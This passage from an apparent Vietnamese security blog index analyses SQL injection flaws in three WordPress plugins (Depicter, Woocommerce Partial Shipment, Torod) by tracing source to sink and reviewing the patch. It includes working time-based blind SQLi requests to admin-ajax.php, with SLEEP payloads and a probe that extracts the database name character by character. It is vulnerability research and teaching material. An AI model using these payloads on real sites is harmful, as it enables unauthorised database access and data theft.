Sanitize::textfield($request-\u0026gt;query(\u0026#39;ids\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;sources\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;sources\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateStart\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateStart\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;dateEnd\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;dateEnd\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;order\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;order\u0026#39;, \u0026#39;DESC\u0026#39;)), \u0026#39;orderBy\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;orderBy\u0026#39;, \u0026#39;id\u0026#39;)), \u0026#39;page\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;page\u0026#39;, 1)), \u0026#39;perPage\u0026#39; =\u0026gt; Sanitize::int($request-\u0026gt;query(\u0026#39;perpage\u0026#39;, 10)), \u0026#39;columns\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;columns\u0026#39;, \u0026#39;\u0026#39;)), \u0026#39;includeFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;includeFields\u0026#39;, false)), \u0026#39;skipCustomFields\u0026#39; =\u0026gt; Sanitize::textfield($request-\u0026gt;query(\u0026#39;skipCustomFields\u0026#39;, false)) ]; $response = \\Depicter::leadRepository()-\u0026gt;getResults($args); return \\Depicter::json($response); } {: file=\u0026ldquo;app/src/Controllers/Ajax/LeadsAjaxController.php v3.2\u0026rdquo; }\nƒê·ªÉ bi·∫øt getResults th·ª±c thi query nh∆∞ n√†o, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a function getResults ho·∫∑c Ctrl + Click v√†o getResults\nüëâ Khi t√¨m ki·∫øm, ta th·∫•y k·∫øt qu·∫£ c√≥ hai h√†m getResults. D·ª±a v√†o t√™n class c√≥ th·ªÉ nh·∫≠n th·∫•y s·ª± li√™n quan gi·ªØa class LeadRepository v√† h√†m leadRepository(), nhi·ªÅu kh·∫£ nƒÉng Depicter::leadRepository() s·∫Ω tr·∫£ v·ªÅ m·ªôt instance c·ªßa class LeadRepository. B√™n c·∫°nh ƒë√≥, ta c√≥ th·ªÉ d·ª±a v√†o s·ªë l∆∞·ª£ng tham s·ªë truy·ªÅn v√†o ƒë·ªÉ x√°c ƒë·ªãnh ch√≠nh x√°c h√†m getResults n√†o m·ªõi l√† h√†m c·∫ßn ph√¢n t√≠ch.\nTa th·∫•y ƒëi·ªÅu ki·ªán if,khi kh√¥ng c√≥ param includeFields th√¨ getLeadsResults s·∫Ω ƒë∆∞·ª£c g·ªçi, quan s√°t getLeadsResults trong c√πng class:\nprotected function getLeadsResults( $args ){ // Purpose of joining tables is being able to search in leadField values as well $leadTable = $this-\u0026gt;lead()-\u0026gt;getTable(); $leads = Lead::new()-\u0026gt;select( \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;{$leadTable}.source_id\u0026#34;, \u0026#34;{$leadTable}.content_id\u0026#34;, \u0026#34;{$leadTable}.content_name\u0026#34;, \u0026#34;{$leadTable}.created_at\u0026#34;, \u0026#34;lf.name as fieldName\u0026#34;, \u0026#34;lf.value as fieldValue\u0026#34; )-\u0026gt;join( \u0026#34;{$this-\u0026gt;leadField()-\u0026gt;getTable()} AS lf\u0026#34;, \u0026#34;{$leadTable}.id\u0026#34;, \u0026#34;=\u0026#34;, \u0026#34;lf.lead_id\u0026#34; ); // other logic if( ! empty( $args[\u0026#39;s\u0026#39;] ) ){ $search = \u0026#34;\u0026#39;%\u0026#34;. $args[\u0026#39;s\u0026#39;] .\u0026#34;%\u0026#39;\u0026#34;; $leads-\u0026gt;appendRawWhere(\u0026#39;AND\u0026#39;, \u0026#34;( lf.value like {$search} OR {$leadTable}.content_name like {$search} )\u0026#34;); } $results = $this-\u0026gt;paginate( $leads, $args ); } {: file=\u0026ldquo;app/src/Database/Repository/LeadRepository.php v3.2\u0026rdquo; }\nTa th·∫•y param s, n∆°i ƒë∆∞·ª£c b·∫£n v√° b·∫£o v·ªá ƒë√£ ƒë∆∞·ª£c n·ªëi tr·ª±c ti·∫øp v√†o c√¢u query b·∫±ng h√†m appendRawWhere. Khi ƒë√≥ 1 ph·∫ßn query t∆∞∆°ng ·ª©ng s·∫Ω l√†:\nAND (lf.value like \u0026#39;%s_here%\u0026#39; OR leadtable.content_name like \u0026#39;%s_here%\u0026#39;) üëâ Nh∆∞ v·∫≠y khi g·ª≠i GET request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi params:\naction=depicter-lead-index\u0026amp;s=payload_here list ƒë∆∞·ª£c g·ªçi v·ªõi duy nh·∫•t param s ƒë∆∞·ª£c th√™m v√†o $args, c√≤n l·∫°i ƒë∆∞·ª£c set gi√° tr·ªã m·∫∑c ƒë·ªãnh getResults ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $args ƒêi·ªÅu ki·ªán if( ! $args['includeFields'] ) trong getResults khi includeFields m·∫∑c ƒë·ªãnh l√† false =\u0026gt; getLeadsResults ƒë∆∞·ª£c g·ªçi Th·ª±c hi·ªán truy v·∫•n g√¢y l·ªói SQLi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here Payload ƒë∆∞·ª£c decode:\n999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- - Khi ƒë√≥ m·ªôt ph·∫ßn c·ªßa c√¢u query tr·ªü th√†nh\nAND (lf.value like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) -- \u0026#39; OR leadtable.content_name like \u0026#39;999%\u0026#39; AND (SELECT 1 FROM (SELECT SLEEP(5))a)) #\u0026#39;) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nSubquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /wp-admin/admin-ajax.php?action=depicter-lead-list\u0026amp;s=999%25\u0026#39;+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1))a))+--+-+ HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ s ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-2011 trong plugin WordPress Depicter Slider tr∆∞·ªõc phi√™n b·∫£n 3.6.2, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ƒë√£ escape SQL khi·∫øn d·ªØ li·ªáu tr∆∞·ªõc khi ƒë∆∞a v√†o tr·ªü th√†nh chu·ªói thu·∫ßn kh√¥ng th·ªÉ tho√°t ra kh·ªèi '%...%'\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Depicter Slider Plugin \u0026lt;= 3.6.1 is vulnerable to SQL Injection ","permalink":"//localhost:1313/vi/posts/2025-09-11-cve-2025-2011/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eDepicter Slider\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.6.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-2011\"\u003eCVE-2025-2011\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/depicter/\"\u003eWordPress Depicter Slider Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.6.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDepicter Slider\u003c/strong\u003e:  v3.6.1(vul) v√† v3.6.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-2011"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nget_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.\nHow it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.\nfunction wxp_order_set_shipped(){ $order_id = isset($_POST[\u0026#39;order_id\u0026#39;]) ? $_POST[\u0026#39;order_id\u0026#39;] : 0; // other logic $wxp_shipment = $this-\u0026gt;get_wxp_shipment_data($order_id); if(isset($_POST[\u0026#39;order_id\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;order_id\u0026#39;]){ global $wpdb; $shipment_id = $this-\u0026gt;get_shipment_id($_POST[\u0026#39;order_id\u0026#39;]); if(!$shipment_id){ $data = array( \u0026#39;order_id\u0026#39; =\u0026gt;$order_id, \u0026#39;shipment_id\u0026#39; =\u0026gt;1, \u0026#39;shipment_url\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_num\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_date\u0026#39;=\u0026gt;current_time(\u0026#39;timestamp\u0026#39;,0), ); $wpdb-\u0026gt;insert($wpdb-\u0026gt;prefix.\u0026#34;partial_shipment\u0026#34;,$data,array(\u0026#39;%d\u0026#39;,\u0026#39;%d\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;)); $shipment_id = $wpdb-\u0026gt;insert_id; } // other logic } echo json_encode(array(\u0026#39;order_id\u0026#39;=\u0026gt;$order_id,\u0026#39;status\u0026#39;=\u0026gt;$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.\nƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin.\nwxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u0026gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p\nüëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë:\naction=wxp_order_set_shipped\u0026amp;order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i\nTa s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn.\nV√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Woocommerce Partial Shipment Plugin \u0026lt;= 3.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-48118/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e:  v3.2(vul) v√† v3.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48118"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ 